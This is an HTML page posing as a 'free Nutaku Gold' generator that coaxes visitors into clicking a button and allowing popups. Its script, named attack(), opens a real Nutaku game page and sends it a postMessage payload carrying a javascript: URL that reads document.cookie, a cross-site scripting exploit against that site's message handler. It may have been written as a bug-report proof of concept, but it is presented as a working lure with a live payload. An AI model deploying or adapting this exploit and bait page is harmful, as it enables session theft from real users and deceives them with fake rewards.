<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nutaku Gold Generator</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }

        .container {
            background: #2a2a2a;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 0 30px rgba(255, 215, 0, 0.3); /* Gold glow */
            border: 2px solid #ffd700;
            max-width: 500px;
            width: 90%;
        }

        h1 {
            color: #ffd700; /* Gold text */
            font-size: 3rem;
            margin-bottom: 10px;
            text-transform: uppercase;
            text-shadow: 2px 2px 5px #000;
        }

        .steps {
            text-align: left;
            background: #333;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            font-size: 1.1rem;
            line-height: 1.6;
        }

        .steps strong {
            color: #ffd700;
        }

        button {
            background: linear-gradient(45deg, #ffd700, #ffa500);
            color: #000;
            font-size: 1.5rem;
            font-weight: bold;
            padding: 15px 40px;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            margin-top: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }

        button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(255, 215, 0, 0.6);
        }

        .footer {
            margin-top: 20px;
            font-size: 0.9rem;
            color: #888;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>FREE NUTAKU GOLD</h1>
        
        <div class="steps">
            Follow these 2 steps to get your Gold:
            <ol>
                <li>Click the <strong>CLAIM GOLD</strong> button below.</li>
                <li>In the new tab that opens, look for the "Popup Blocked" icon and select <strong>Allow Popup</strong>.</li>
            </ol>
            <p style="text-align: center; color: #4caf50; font-weight: bold;">
                Verify via popup to receive 5,000 Gold instantly!
            </p>
        </div>

        <button onclick="attack()">CLAIM GOLD</button>
        
        <div class="footer">Limited time offer. Terms apply.</div>
    </div>

    <script>
    function attack() {
       
        const victim = window.open("https://www.nutaku.net/games/flirt-plaza/play/");

        
        setTimeout(() => {
           
            const payload = JSON.stringify(["openUrl", "javascript:alert('XSS Successful! Session: ' + document.cookie)"]);
           
            try { victim.postMessage(payload, "*"); } catch(e) {}
            
            
            try {
                for (let i = 0; i < victim.length; i++) {
                    victim[i].postMessage(payload, "*");
                }
            } catch(e) {
                console.log("Frame access restricted, but message might have sent.");
            }
            
            console.log("Exploit payload sent.");
        }, 4000); 
    }
    </script>

</body>
</html>
